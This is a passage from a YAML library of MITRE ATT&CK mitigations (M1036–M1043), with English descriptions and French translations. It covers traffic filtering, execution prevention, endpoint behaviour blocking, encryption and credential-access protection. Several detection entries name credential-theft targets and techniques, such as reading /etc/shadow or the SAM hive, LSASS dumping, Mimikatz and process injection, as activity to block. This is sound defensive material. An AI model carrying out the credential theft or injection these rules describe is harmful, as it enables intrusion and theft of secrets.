          \ inutilis\xE9s s\u2019ils ne sont pas correctement surveill\xE9s ou d\xE9\
          sactiv\xE9s.\n\n**Outils de mise en \u0153uvre** :\n\n- Objets de strat\xE9\
          gie de groupe (GPO) sous Windows : pour appliquer des seuils de verrouillage\
          \ des comptes, des restrictions de dur\xE9e de connexion, des d\xE9lais\
          \ d\u2019expiration de session et des politiques de mot de passe.\n- Solutions\
          \ de gestion des identit\xE9s et des acc\xE8s (IAM) : pour la gestion centralis\xE9\
          e des comptes utilisateurs, des politiques de session et la d\xE9sactivation\
          \ automatis\xE9e des comptes.\n- Plateformes de gestion des informations\
          \ et des \xE9v\xE9nements de s\xE9curit\xE9 (SIEM) : pour surveiller et\
          \ signaler toute activit\xE9 de connexion inhabituelle, telle que les \xE9\
          checs de connexion ou les tentatives d\u2019acc\xE8s en dehors des heures\
          \ d\u2019ouverture.\n- Outils d\u2019authentification multifactorielle (MFA)\
          \ : pour renforcer encore davantage la s\xE9curit\xE9 des tentatives de\
          \ connexion, en emp\xEAchant les attaques par force brute ou par \xAB credential\
          \ stuffing \xBB.\nhttps://attack.mitre.org/mitigations/M1036\""
  - urn: urn:intuitem:risk:function:mitre-attack:m1037
    ref_id: M1037
    name: Filter Network Traffic
    category: technical
    csf_function: protect
    description: 'Employ network appliances and endpoint software to filter ingress,
      egress, and lateral network traffic. This includes protocol-based filtering,
      enforcing firewall rules, and blocking or restricting traffic based on predefined
      conditions to limit adversary movement and data exfiltration. This mitigation
      can be implemented through the following measures:


      Ingress Traffic Filtering:


      - Use Case: Configure network firewalls to allow traffic only from authorized
      IP addresses to public-facing servers.

      - Implementation: Limit SSH (port 22) and RDP (port 3389) traffic to specific
      IP ranges.


      Egress Traffic Filtering:


      - Use Case: Use firewalls or endpoint security software to block unauthorized
      outbound traffic to prevent data exfiltration and command-and-control (C2) communications.

      - Implementation: Block outbound traffic to known malicious IPs or regions where
      communication is unexpected.


      Protocol-Based Filtering:


      - Use Case: Restrict the use of specific protocols that are commonly abused
      by adversaries, such as SMB, RPC, or Telnet, based on business needs.

      - Implementation: Disable SMBv1 on endpoints to prevent exploits like EternalBlue.


      Network Segmentation:


      - Use Case: Create network segments for critical systems and restrict communication
      between segments unless explicitly authorized.

      - Implementation: Implement VLANs to isolate IoT devices or guest networks from
      core business systems.


      Application Layer Filtering:


      - Use Case: Use proxy servers or Web Application Firewalls (WAFs) to inspect
      and block malicious HTTP/S traffic.

      - Implementation: Configure a WAF to block SQL injection attempts or other web
      application exploitation techniques.

      https://attack.mitre.org/mitigations/M1037'
    translations:
      fr:
        name: "Filtrer le trafic r\xE9seau"
        description: "Utilisez des appliances r\xE9seau et des logiciels de terminaux\
          \ pour filtrer le trafic d\u2019entr\xE9e, de sortie et de passage lat\xE9\
          ral. Cela inclut le filtrage bas\xE9 sur des protocoles, l\u2019application\
          \ des r\xE8gles de pare-feu, ainsi que le blocage ou la restriction du trafic\
          \ selon des conditions pr\xE9d\xE9finies afin de limiter les mouvements\
          \ des adversaires et l\u2019exfiltration des donn\xE9es. Cette att\xE9nuation\
          \ peut \xEAtre mise en \u0153uvre par les mesures suivantes :\n\nFiltrage\
          \ du trafic d\u2019entr\xE9e :\n\n- Cas d\u2019utilisation : Configurez\
          \ les pare-feux r\xE9seau pour autoriser le trafic uniquement provenant\
          \ d\u2019adresses IP autoris\xE9es vers des serveurs publics.\n- Impl\xE9\
          mentation : Limiter le trafic SSH (port 22) et RDP (port 3389) \xE0 des\
          \ plages IP sp\xE9cifiques.\n\nFiltrage du trafic de sortie :\n\n- Cas d\u2019\
          utilisation : Utiliser des pare-feux ou des logiciels de s\xE9curit\xE9\
          \ de terminaux pour bloquer le trafic sortant non autoris\xE9 afin d\u2019\
          emp\xEAcher l\u2019exfiltration de donn\xE9es et les communications de commandement\
          \ et de contr\xF4le (C2).\n- Impl\xE9mentation : Bloquer le trafic sortant\
          \ vers des IP malveillantes connues ou des r\xE9gions o\xF9 la communication\
          \ est inattendue.\n\nFiltrage bas\xE9 sur le protocole :\n\n- Cas d\u2019\
          utilisation : Restreindre l\u2019utilisation de protocoles sp\xE9cifiques\
          \ couramment abus\xE9s par les adversaires, tels que SMB, RPC ou Telnet,\
          \ en fonction des besoins m\xE9tier.\n- Impl\xE9mentation : D\xE9sactiver\
          \ SMBv1 sur les points de terminaison pour pr\xE9venir des failles comme\
          \ EternalBlue.\n\nSegmentation du r\xE9seau :\n\n- Cas d\u2019utilisation\
          \ : Cr\xE9er des segments r\xE9seau pour des syst\xE8mes critiques et restreindre\
          \ la communication entre segments sauf autorisation explicite.\n- Impl\xE9\
          mentation : impl\xE9menter des VLANs pour isoler les appareils IoT ou les\
          \ r\xE9seaux invit\xE9s des syst\xE8mes m\xE9tier principaux.\n\nFiltrage\
          \ de la couche application :\n\n- Cas d\u2019utilisation : Utiliser des\
          \ serveurs proxy ou des pare-feux d\u2019applications Web (WAF) pour inspecter\
          \ et bloquer le trafic HTTP/S malveillant.\n- Impl\xE9mentation : Configurez\
          \ un WAF pour bloquer les tentatives d\u2019injection SQL ou d\u2019autres\
          \ techniques d\u2019exploitation d\u2019applications web.\nhttps://attack.mitre.org/mitigations/M1037"
  - urn: urn:intuitem:risk:function:mitre-attack:m1038
    ref_id: M1038
    name: Execution Prevention
    category: technical
    csf_function: protect
    description: "Prevent the execution of unauthorized or malicious code on systems\
      \ by implementing application control, script blocking, and other execution\
      \ prevention mechanisms. This ensures that only trusted and authorized code\
      \ is executed, reducing the risk of malware and unauthorized actions. This mitigation\
      \ can be implemented through the following measures:\n\nApplication Control:\n\
      \n- Use Case: Use tools like AppLocker or Windows Defender Application Control\
      \ (WDAC) to create whitelists of authorized applications and block unauthorized\
      \ ones. On Linux, use tools like SELinux or AppArmor to define mandatory access\
      \ control policies for application execution.\n- Implementation: Allow only\
      \ digitally signed or pre-approved applications to execute on servers and endpoints.\
      \ (e.g., `New-AppLockerPolicy -PolicyType Enforced -FilePath \"C:\\Policies\\\
      AppLocker.xml\"`) \n\n\nScript Blocking:\n\n- Use Case: Use script control mechanisms\
      \ to block unauthorized execution of scripts, such as PowerShell or JavaScript.\
      \ Web Browsers: Use browser extensions or settings to block JavaScript execution\
      \ from untrusted sources.\n- Implementation: Configure PowerShell to enforce\
      \ Constrained Language Mode for non-administrator users. (e.g., `Set-ExecutionPolicy\
      \ AllSigned`) \n\nExecutable Blocking:\n\n- Use Case: Prevent execution of binaries\
      \ from suspicious locations, such as `%TEMP%` or `%APPDATA%` directories.\n\
      - Implementation: Block execution of `.exe`, `.bat`, or `.ps1` files from user-writable\
      \ directories.\n\nDynamic Analysis Prevention:\n- Use Case: Use behavior-based\
      \ execution prevention tools to identify and block malicious activity in real\
      \ time.\n- Implemenation: Employ EDR solutions that analyze runtime behavior\
      \ and block suspicious code execution.\nhttps://attack.mitre.org/mitigations/M1038"
    translations:
      fr:
        name: "Pr\xE9vention de l\u2019ex\xE9cution"
        description: "Emp\xEAcher l\u2019ex\xE9cution de code non autoris\xE9 ou malveillant\
          \ sur les syst\xE8mes en impl\xE9mentant le contr\xF4le des applications,\
          \ le blocage de scripts et d\u2019autres m\xE9canismes de pr\xE9vention\
          \ des ex\xE9cutions. Cela garantit que seul le code fiable et autoris\xE9\
          \ est ex\xE9cut\xE9, r\xE9duisant ainsi le risque de logiciels malveillants\
          \ et d\u2019actions non autoris\xE9es. Cette att\xE9nuation peut \xEAtre\
          \ mise en \u0153uvre par les mesures suivantes :\n\nContr\xF4le des applications\
          \ :\n\n- Cas d\u2019utilisation : Utilisez des outils comme AppLocker ou\
          \ Windows Defender Application Control (WDAC) pour cr\xE9er des listes blanches\
          \ d\u2019applications autoris\xE9es et bloquer celles non autoris\xE9es.\
          \ Sous Linux, utilisez des outils comme SELinux ou AppArmor pour d\xE9finir\
          \ des politiques de contr\xF4le d\u2019acc\xE8s obligatoires pour l\u2019\
          ex\xE9cution des applications.\n- Impl\xE9mentation : N\u2019autoriser que\
          \ les applications num\xE9riquement sign\xE9es ou pr\xE9-approuv\xE9es \xE0\
          \ s\u2019ex\xE9cuter sur les serveurs et les points de terminaison. (par\
          \ exemple, \xAB New-AppLockerPolicy -PolicyType Enforced -FilePath \xAB\_\
          C\_:\\Policies\\AppLocker.xml\"') \n\nBlocage de script :\n\n- Cas d\u2019\
          utilisation : Utiliser des m\xE9canismes de contr\xF4le de script pour bloquer\
          \ l\u2019ex\xE9cution non autoris\xE9e de scripts, tels que PowerShell ou\
          \ JavaScript. Navigateurs web : Utilisez des extensions ou des param\xE8\
          tres de navigateur pour bloquer l\u2019ex\xE9cution de JavaScript \xE0 partir\
          \ de sources non fiables.\n- Impl\xE9mentation : Configurer PowerShell pour\
          \ imposer le mode langage contraint aux utilisateurs non administrateurs.\
          \ (par exemple, \xAB Set-ExecutionPolicy AllSigned \xBB) \n\nBlocage ex\xE9\
          cutable :\n\n- Cas d\u2019utilisation : Emp\xEAcher l\u2019ex\xE9cution\
          \ de binaires depuis des emplacements suspects, tels que les annuaires '\_\
          %TEMP\_%' ou '\_%APPDATA\_%'.\n- Impl\xE9mentation : ex\xE9cution par blocs\
          \ de fichiers '.exe', '.bat' ou '.ps1' \xE0 partir de r\xE9pertoires \xE9\
          crivables par l\u2019utilisateur.\n\nPr\xE9vention de l\u2019analyse dynamique\
          \ :\n- Cas d\u2019utilisation : Utilisez des outils de pr\xE9vention d\u2019\
          ex\xE9cution bas\xE9s sur le comportement pour identifier et bloquer en\
          \ temps r\xE9el des activit\xE9s malveillantes.\n- Mise en pratique : Employer\
          \ des solutions EDR qui analysent le comportement \xE0 l\u2019ex\xE9cution\
          \ et bloquent l\u2019ex\xE9cution de code suspecte.\nhttps://attack.mitre.org/mitigations/M1038"
  - urn: urn:intuitem:risk:function:mitre-attack:m1039
    ref_id: M1039
    name: Environment Variable Permissions
    category: technical
    csf_function: protect
    description: 'Restrict the modification of environment variables to authorized
      users and processes by enforcing strict permissions and policies. This ensures
      the integrity of environment variables, preventing adversaries from abusing
      or altering them for malicious purposes. This mitigation can be implemented
      through the following measures:


      Restrict Write Access:


      - Use Case: Set file system-level permissions to restrict access to environment
      variable configuration files (e.g., `.bashrc`, `.bash_profile`, `.zshrc`, `systemd`
      service files).

      - Implementation: Configure `/etc/environment` or `/etc/profile` on Linux systems
      to only allow root or administrators to modify the file.


      Secure Access Controls:


      - Use Case: Limit access to environment variable settings in application deployment
      tools or CI/CD pipelines to authorized personnel.

      - Implementation: Use role-based access control (RBAC) in tools like Jenkins
      or GitLab to ensure only specific users can modify environment variables.


      Restrict Process Scope:


      - Use Case: Configure policies to ensure environment variables are only accessible
      to the processes they are explicitly intended for.

      - Implementation: Use containerized environments like Docker to isolate environment
      variables to specific containers and ensure they are not inherited by other
      processes.


      Audit Environment Variable Changes:


      - Use Case: Enable logging for changes to critical environment variables.

      - Implementation: Use `auditd` on Linux to monitor changes to files like `/etc/environment`
      or application-specific environment files.

      https://attack.mitre.org/mitigations/M1039'
    translations:
      fr:
        name: "Permissions des variables d\u2019environnement"
        description: "Restreignez la modification des variables d\u2019environnement\
          \ aux utilisateurs et processus autoris\xE9s en appliquant des autorisations\
          \ et des politiques strictes. Cela garantit l\u2019int\xE9grit\xE9 des variables\
          \ environnementales, emp\xEAchant les adversaires de les abuser ou de les\
          \ modifier \xE0 des fins malveillantes. Cette att\xE9nuation peut \xEAtre\
          \ mise en \u0153uvre par les mesures suivantes :\n\nRestreindre l\u2019\
          acc\xE8s \xE0 l\u2019\xE9criture :\n\n- Cas d\u2019utilisation : D\xE9finir\
          \ des permissions au niveau du syst\xE8me de fichiers pour restreindre l\u2019\
          acc\xE8s aux fichiers de configuration des variables d\u2019environnement\
          \ (par exemple, '.bashrc', '.bash_profile', '.zshrc', 'systemd').\n- Impl\xE9\
          mentation : Configurer '/etc/environment' ou '/etc/profile' sur les syst\xE8\
          mes Linux pour ne permettre qu\u2019aux utilisateurs root ou administrateurs\
          \ de modifier le fichier.\n\nContr\xF4les d\u2019acc\xE8s s\xE9curis\xE9\
          s :\n\n- Cas d\u2019utilisation : Limiter l\u2019acc\xE8s aux param\xE8\
          tres de variables d\u2019environnement dans les outils de d\xE9ploiement\
          \ applicatif ou les pipelines CI/CD au personnel autoris\xE9.\n- Impl\xE9\
          mentation : Utiliser le contr\xF4le d\u2019acc\xE8s bas\xE9 sur les r\xF4\
          les (RBAC) dans des outils comme Jenkins ou GitLab pour s\u2019assurer que\
          \ seuls des utilisateurs sp\xE9cifiques peuvent modifier les variables d\u2019\
          environnement.\n\nRestreindre la port\xE9e du processus :\n\n- Cas d\u2019\
          utilisation : Configurer les politiques pour garantir que les variables\
          \ d\u2019environnement ne soient accessibles qu\u2019aux processus pour\
          \ lesquels elles sont explicitement destin\xE9es.\n- Impl\xE9mentation :\
          \ Utiliser des environnements conteneuris\xE9s comme Docker pour isoler\
          \ les variables d\u2019environnement dans des conteneurs sp\xE9cifiques\
          \ et s\u2019assurer qu\u2019elles ne sont pas h\xE9rit\xE9es par d\u2019\
          autres processus.\n\nChangements des variables de l\u2019environnement d\u2019\
          audit :\n\n- Cas d\u2019utilisation : Activer la journalisation des modifications\
          \ des variables critiques de l\u2019environnement.\n- Impl\xE9mentation\
          \ : Utiliser 'auditd' sur Linux pour surveiller les modifications de fichiers\
          \ comme '/etc/environnement' ou les fichiers d\u2019environnement sp\xE9\
          cifiques \xE0 une application.\nhttps://attack.mitre.org/mitigations/M1039"
  - urn: urn:intuitem:risk:function:mitre-attack:m1040
    ref_id: M1040
    name: Behavior Prevention on Endpoint
    category: technical
    csf_function: detect
    description: 'Behavior Prevention on Endpoint refers to the use of technologies
      and strategies to detect and block potentially malicious activities by analyzing
      the behavior of processes, files, API calls, and other endpoint events. Rather
      than relying solely on known signatures, this approach leverages heuristics,
      machine learning, and real-time monitoring to identify anomalous patterns indicative
      of an attack. This mitigation can be implemented through the following measures:


      Suspicious Process Behavior:


      - Implementation: Use Endpoint Detection and Response (EDR) tools to monitor
      and block processes exhibiting unusual behavior, such as privilege escalation
      attempts.

      - Use Case: An attacker uses a known vulnerability to spawn a privileged process
      from a user-level application. The endpoint tool detects the abnormal parent-child
      process relationship and blocks the action.


      Unauthorized File Access:


      - Implementation: Leverage Data Loss Prevention (DLP) or endpoint tools to block
      processes attempting to access sensitive files without proper authorization.

      - Use Case: A process tries to read or modify a sensitive file located in a
      restricted directory, such as /etc/shadow on Linux or the SAM registry hive
      on Windows. The endpoint tool identifies this anomalous behavior and prevents
      it.


      Abnormal API Calls:


      - Implementation: Implement runtime analysis tools to monitor API calls and
      block those associated with malicious activities.

      - Use Case: A process dynamically injects itself into another process to hijack
      its execution. The endpoint detects the abnormal use of APIs like `OpenProcess`
      and `WriteProcessMemory` and terminates the offending process.


      Exploit Prevention:


      - Implementation: Use behavioral exploit prevention tools to detect and block
      exploits attempting to gain unauthorized access.

      - Use Case: A buffer overflow exploit is launched against a vulnerable application.
      The endpoint detects the anomalous memory write operation and halts the process.

      https://attack.mitre.org/mitigations/M1040'
    translations:
      fr:
        name: "Pr\xE9vention du comportement sur Endpoint"
        description: "La pr\xE9vention du comportement sur les points de terminaison\
          \ d\xE9signe l\u2019utilisation de technologies et de strat\xE9gies pour\
          \ d\xE9tecter et bloquer des activit\xE9s potentiellement malveillantes\
          \ en analysant le comportement des processus, fichiers, appels API et autres\
          \ \xE9v\xE9nements de points de terminaison. Plut\xF4t que de se fier uniquement\
          \ \xE0 des signatures connues, cette approche utilise des heuristiques,\
          \ l\u2019apprentissage automatique et la surveillance en temps r\xE9el pour\
          \ identifier des motifs anormaux indiquant une attaque. Cette att\xE9nuation\
          \ peut \xEAtre mise en \u0153uvre par les mesures suivantes :\n\nComportement\
          \ suspect dans le processus :\n\n- Impl\xE9mentation : Utiliser des outils\
          \ de d\xE9tection et de r\xE9ponse de point d\u2019extr\xE9mit\xE9 (EDR)\
          \ pour surveiller et bloquer les processus pr\xE9sentant des comportements\
          \ inhabituels, tels que les tentatives d\u2019escalade de privil\xE8ges.\n\
          - Cas d\u2019utilisation : Un attaquant utilise une vuln\xE9rabilit\xE9\
          \ connue pour g\xE9n\xE9rer un processus privil\xE9gi\xE9 \xE0 partir d\u2019\
          une application au niveau utilisateur. L\u2019outil endpoint d\xE9tecte\
          \ la relation anormale parent-enfant et bloque l\u2019action.\n\nAcc\xE8\
          s non autoris\xE9 aux fichiers :\n\n- Impl\xE9mentation : Exploiter la pr\xE9\
          vention de la perte de donn\xE9es (DLP) ou des outils de terminaison pour\
          \ bloquer les processus tentant d\u2019acc\xE9der \xE0 des fichiers sensibles\
          \ sans autorisation appropri\xE9e.\n- Cas d\u2019utilisation : Un processus\
          \ tente de lire ou de modifier un fichier sensible situ\xE9 dans un r\xE9\
          pertoire restreint, tel que /etc/shadow sur Linux ou le registre SAM hive\
          \ sous Windows. L\u2019outil endpoint identifie ce comportement anormal\
          \ et le pr\xE9vient.\n\nAppels API anormaux :\n\n- Impl\xE9mentation : Impl\xE9\
          menter des outils d\u2019analyse \xE0 l\u2019ex\xE9cution pour surveiller\
          \ les appels API et bloquer ceux associ\xE9s \xE0 des activit\xE9s malveillantes.\n\
          - Cas d\u2019utilisation : Un processus s\u2019injecte dynamiquement dans\
          \ un autre processus pour d\xE9tourner son ex\xE9cution. Le point d\u2019\
          extr\xE9mit\xE9 d\xE9tecte l\u2019utilisation anormale d\u2019API comme\
          \ \xAB OpenProcess \xBB et \xAB WriteProcessMemory \xBB et met fin au processus\
          \ incrimin\xE9.\n\nPr\xE9vention des exploits :\n\n- Mise en \u0153uvre\
          \ : Utiliser des outils de pr\xE9vention des exploits comportementaux pour\
          \ d\xE9tecter et bloquer les exploits tentant d\u2019obtenir un acc\xE8\
          s non autoris\xE9.\n- Cas d\u2019utilisation : Une exploitation de d\xE9\
          bordement de tampon est lanc\xE9e contre une application vuln\xE9rable.\
          \ Le point d\u2019extr\xE9mit\xE9 d\xE9tecte l\u2019op\xE9ration d\u2019\
          \xE9criture anormale de m\xE9moire et arr\xEAte le processus.\nhttps://attack.mitre.org/mitigations/M1040"
  - urn: urn:intuitem:risk:function:mitre-attack:m1041
    ref_id: M1041
    name: Encrypt Sensitive Information
    category: technical
    csf_function: protect
    description: "Protect sensitive information at rest, in transit, and during processing\
      \ by using strong encryption algorithms. Encryption ensures the confidentiality\
      \ and integrity of data, preventing unauthorized access or tampering. This mitigation\
      \ can be implemented through the following measures:\n\nEncrypt Data at Rest:\n\
      \n- Use Case: Use full-disk encryption or file-level encryption to secure sensitive\
      \ data stored on devices.\n- Implementation: Implement BitLocker for Windows\
      \ systems or FileVault for macOS devices to encrypt hard drives.\n\nEncrypt\
      \ Data in Transit:\n\n- Use Case: Use secure communication protocols (e.g.,\
      \ TLS, HTTPS) to encrypt sensitive data as it travels over networks.\n- Implementation:\
      \ Enable HTTPS for all web applications and configure mail servers to enforce\
      \ STARTTLS for email encryption.\n\nEncrypt Backups:\n\n- Use Case: Ensure that\
      \ backup data is encrypted both during storage and transfer to prevent unauthorized\
      \ access.\n- Implementation: Encrypt cloud backups using AES-256 before uploading\
      \ them to Amazon S3 or Google Cloud.\n\nEncrypt Application Secrets:\n\n- Use\
      \ Case: Store sensitive credentials, API keys, and configuration files in encrypted\
      \ vaults.\n- Implementation: Use HashiCorp Vault or AWS Secrets Manager to manage\
      \ and encrypt secrets.\n\nDatabase Encryption:\n\n- Use Case: Enable Transparent\
      \ Data Encryption (TDE) or column-level encryption in database management systems.\n\
      - Implementation: Use MySQL\u2019s built-in encryption features to encrypt sensitive\
      \ database fields such as social security numbers.\nhttps://attack.mitre.org/mitigations/M1041"
    translations:
      fr:
        name: Chiffrer les informations sensibles
        description: "Prot\xE9gez les informations sensibles au repos, en transit\
          \ et pendant le traitement en utilisant des algorithmes de chiffrement puissants.\
          \ Le chiffrement garantit la confidentialit\xE9 et l\u2019int\xE9grit\xE9\
          \ des donn\xE9es, emp\xEAchant les acc\xE8s ou les falsifications non autoris\xE9\
          es. Cette att\xE9nuation peut \xEAtre mise en \u0153uvre par les mesures\
          \ suivantes :\n\nChiffrer les donn\xE9es au repos :\n\n- Cas d\u2019utilisation\
          \ : Utilisez le chiffrement complet du disque ou le chiffrement au niveau\
          \ des fichiers pour s\xE9curiser les donn\xE9es sensibles stock\xE9es sur\
          \ les appareils.\n- Impl\xE9mentation : Impl\xE9menter BitLocker pour les\
          \ syst\xE8mes Windows ou FileVault pour les appareils macOS afin de chiffrer\
          \ les disques durs.\n\nChiffrer les donn\xE9es en transit :\n\n- Cas d\u2019\
          utilisation : Utiliser des protocoles de communication s\xE9curis\xE9s (par\
          \ exemple, TLS, HTTPS) pour chiffrer les donn\xE9es sensibles lors de leur\
          \ passage sur les r\xE9seaux.\n- Impl\xE9mentation : Activer HTTPS pour\
          \ toutes les applications web et configurer les serveurs de messagerie pour\
          \ faire respecter STARTTLS pour le chiffrement des e-mails.\n\nChiffrer\
          \ les sauvegardes :\n\n- Cas d\u2019utilisation : S\u2019assurer que les\
          \ donn\xE9es de sauvegarde sont chiffr\xE9es \xE0 la fois pendant le stockage\
          \ et le transfert afin d\u2019\xE9viter tout acc\xE8s non autoris\xE9.\n\
          - Impl\xE9mentation : Chiffrer les sauvegardes cloud \xE0 l\u2019aide d\u2019\
          AES-256 avant de les t\xE9l\xE9charger sur Amazon S3 ou Google Cloud.\n\n\
          Chiffrer les secrets de l\u2019application :\n\n- Cas d\u2019utilisation\
          \ : Stocker des identifiants sensibles, cl\xE9s API et fichiers de configuration\
          \ dans des coffres chiffr\xE9s.\n- Impl\xE9mentation : Utiliser HashiCorp\
          \ Vault ou AWS Secrets Manager pour g\xE9rer et chiffrer les secrets.\n\n\
          Chiffrement des bases de donn\xE9es :\n\n- Cas d\u2019utilisation : Activer\
          \ le chiffrement transparent des donn\xE9es (TDE) ou le chiffrement au niveau\
          \ des colonnes dans les syst\xE8mes de gestion de bases de donn\xE9es.\n\
          - Impl\xE9mentation : Utiliser les fonctionnalit\xE9s de chiffrement int\xE9\
          gr\xE9es \xE0 MySQL pour chiffrer des champs sensibles de base de donn\xE9\
          es tels que les num\xE9ros de s\xE9curit\xE9 sociale.\nhttps://attack.mitre.org/mitigations/M1041"
  - urn: urn:intuitem:risk:function:mitre-attack:m1042
    ref_id: M1042
    name: Disable or Remove Feature or Program
    category: technical
    csf_function: protect
    description: "Disable or remove unnecessary and potentially vulnerable software,\
      \ features, or services to reduce the attack surface and prevent abuse by adversaries.\
      \ This involves identifying software or features that are no longer needed or\
      \ that could be exploited and ensuring they are either removed or properly disabled.\
      \ This mitigation can be implemented through the following measures: \n\nRemove\
      \ Legacy Software:\n\n- Use Case: Disable or remove older versions of software\
      \ that no longer receive updates or security patches (e.g., legacy Java, Adobe\
      \ Flash).\n- Implementation: A company removes Flash Player from all employee\
      \ systems after it has reached its end-of-life date.\n\nDisable Unused Features:\n\
      \n- Use Case: Turn off unnecessary operating system features like SMBv1, Telnet,\
      \ or RDP if they are not required.\n- Implementation: Disable SMBv1 in a Windows\
      \ environment to mitigate vulnerabilities like EternalBlue.\n\nControl Applications\
      \ Installed by Users:\n\n- Use Case: Prevent users from installing unauthorized\
      \ software via group policies or other management tools.\n- Implementation:\
      \ Block user installations of unauthorized file-sharing applications (e.g.,\
      \ BitTorrent clients) in an enterprise environment.\n\nRemove Unnecessary Services:\n\
      \n- Use Case: Identify and disable unnecessary default services running on endpoints,\
      \ servers, or network devices.\n- Implementation: Disable unused administrative\
      \ shares (e.g., C$, ADMIN$) on workstations.\n\nRestrict Add-ons and Plugins:\n\
      \n- Use Case: Remove or disable browser plugins and add-ons that are not needed\
      \ for business purposes.\n- Implementation: Disable Java and ActiveX plugins\
      \ in web browsers to prevent drive-by attacks.\nhttps://attack.mitre.org/mitigations/M1042"
    translations:
      fr:
        name: "D\xE9sactiver ou supprimer une fonctionnalit\xE9 ou un programme"
        description: "D\xE9sactiver ou supprimer des logiciels, fonctionnalit\xE9\
          s ou services inutiles et potentiellement vuln\xE9rables afin de r\xE9duire\
          \ la surface d\u2019attaque et d\u2019\xE9viter les abus par les adversaires.\
          \ Cela implique d\u2019identifier les logiciels ou fonctionnalit\xE9s qui\
          \ ne sont plus n\xE9cessaires ou qui pourraient \xEAtre exploit\xE9s, et\
          \ de s\u2019assurer qu\u2019ils sont soit supprim\xE9s, soit correctement\
          \ d\xE9sactiv\xE9s. Cette att\xE9nuation peut \xEAtre mise en \u0153uvre\
          \ par les mesures suivantes : \n\nSupprimer les logiciels h\xE9rit\xE9s\
          \ :\n\n- Cas d\u2019utilisation : D\xE9sactiver ou supprimer les anciennes\
          \ versions des logiciels qui ne re\xE7oivent plus de mises \xE0 jour ou\
          \ de correctifs de s\xE9curit\xE9 (par exemple, Java h\xE9rit\xE9, Adobe\
          \ Flash).\n- Mise en \u0153uvre : Une entreprise retire Flash Player de\
          \ tous les syst\xE8mes employ\xE9s apr\xE8s sa date de fin de vie.\n\nD\xE9\
          sactivez les fonctionnalit\xE9s inutilis\xE9es :\n\n- Cas d\u2019utilisation\
          \ : d\xE9sactiver les fonctionnalit\xE9s inutiles du syst\xE8me d\u2019\
          exploitation comme SMBv1, Telnet ou RDP si elles ne sont pas n\xE9cessaires.\n\
          - Impl\xE9mentation : D\xE9sactiver SMBv1 dans un environnement Windows\
          \ pour att\xE9nuer des vuln\xE9rabilit\xE9s comme EternalBlue.\n\nApplications\
          \ de contr\xF4le install\xE9es par les utilisateurs :\n\n- Cas d\u2019utilisation\
          \ : Emp\xEAcher les utilisateurs d\u2019installer des logiciels non autoris\xE9\
          s via des politiques de groupe ou d\u2019autres outils de gestion.\n- Impl\xE9\
          mentation : Bloquer les installations utilisateur d\u2019applications de\
          \ partage de fichiers non autoris\xE9es (par exemple, des clients BitTorrent)\
          \ dans un environnement d\u2019entreprise.\n\nSupprimer les services inutiles\
          \ :\n\n- Cas d\u2019utilisation : Identifier et d\xE9sactiver les services\
          \ par d\xE9faut inutiles fonctionnant sur les points de terminaison, serveurs\
          \ ou dispositifs r\xE9seau.\n- Impl\xE9mentation : D\xE9sactiver les partages\
          \ administratifs inutilis\xE9s (par exemple, C$, ADMIN$) sur les postes\
          \ de travail.\n\nRestreignez les add-ons et plugins :\n\n- Cas d\u2019utilisation\
          \ : Supprimer ou d\xE9sactiver les plugins et extensions du navigateur qui\
          \ ne sont pas n\xE9cessaires \xE0 des fins professionnelles.\n- Impl\xE9\
          mentation : D\xE9sactiver les plugins Java et ActiveX dans les navigateurs\
          \ web pour pr\xE9venir les attaques en drive-by.\nhttps://attack.mitre.org/mitigations/M1042"
  - urn: urn:intuitem:risk:function:mitre-attack:m1043
    ref_id: M1043
    name: Credential Access Protection
    category: technical
    csf_function: protect
    description: 'Credential Access Protection focuses on implementing measures to
      prevent adversaries from obtaining credentials, such as passwords, hashes, tokens,
      or keys, that could be used for unauthorized access. This involves restricting
      access to credential storage mechanisms, hardening configurations to block credential
      dumping methods, and using monitoring tools to detect suspicious credential-related
      activity. This mitigation can be implemented through the following measures:


      Restrict Access to Credential Storage:


      - Use Case: Prevent adversaries from accessing the SAM (Security Account Manager)
      database on Windows systems.

      - Implementation: Enforce least privilege principles and restrict administrative
      access to credential stores such as `C:\Windows\System32\config\SAM`.


      Use Credential Guard:


      - Use Case: Isolate LSASS (Local Security Authority Subsystem Service) memory
      to prevent credential dumping.

      - Implementation: Enable Windows Defender Credential Guard on enterprise endpoints
      to isolate secrets and protect them from unauthorized access.


      Monitor for Credential Dumping Tools:


      - Use Case: Detect and block known tools like Mimikatz or Windows Credential
      Editor.

      - Implementation: Flag suspicious process behavior related to credential dumping.


      Disable Cached Credentials:


      - Use Case: Prevent adversaries from exploiting cached credentials on endpoints.

      - Implementation: Configure group policy to reduce or eliminate the use of cached
      credentials (e.g., set Interactive logon: Number of previous logons to cache
      to 0).


      Enable Secure Boot and Memory Protections:


      - Use Case: Prevent memory-based attacks used to extract credentials.

      - Implementation: Configure Secure Boot and enforce hardware-based security
      features like DEP (Data Execution Prevention) and ASLR (Address Space Layout
      Randomization).

      https://attack.mitre.org/mitigations/M1043'
    translations:
      fr:
        name: "Protection d\u2019acc\xE8s aux accr\xE9ditations"
        description: "La Protection d\u2019acc\xE8s aux identifiants se concentre\
          \ sur la mise en \u0153uvre de mesures visant \xE0 emp\xEAcher les adversaires\
          \ d\u2019obtenir des identifiants, tels que des mots de passe, des hachages,\
          \ des jetons ou des cl\xE9s, qui pourraient \xEAtre utilis\xE9s pour des\
          \ acc\xE8s non autoris\xE9s. Cela implique de restreindre l\u2019acc\xE8\
          s aux m\xE9canismes de stockage des identifiants, de renforcer les configurations\
          \ pour bloquer les m\xE9thodes de dumping des identifiants, et d\u2019utiliser\
          \ des outils de surveillance pour d\xE9tecter toute activit\xE9 suspecte\
          \ li\xE9e aux identifiants. Cette att\xE9nuation peut \xEAtre mise en \u0153\
          uvre par les mesures suivantes :\n\nRestreindre l\u2019acc\xE8s au stockage\
          \ des accr\xE9ditations :\n\n- Cas d\u2019utilisation : emp\xEAcher les\
          \ adversaires d\u2019acc\xE9der \xE0 la base de donn\xE9es SAM (Security\
          \ Account Manager) sur les syst\xE8mes Windows.\n- Impl\xE9mentation : Appliquer\
          \ les principes de privil\xE8ge minimum et restreindre l\u2019acc\xE8s administratif\
          \ aux magasins d\u2019identifiants tels que 'C\_:\\Windows\\System32\\config\\\
          SAM'.\n\nUtilisez une protection de cr\xE9dential :\n\n- Cas d\u2019utilisation\
          \ : Isoler la m\xE9moire LSASS (Local Security Authority Subsystem Service)\
          \ pour \xE9viter le dumping des identifiants.\n- Impl\xE9mentation : Activer\
          \ Windows Defender Credential Guard sur les terminaux d\u2019entreprise\
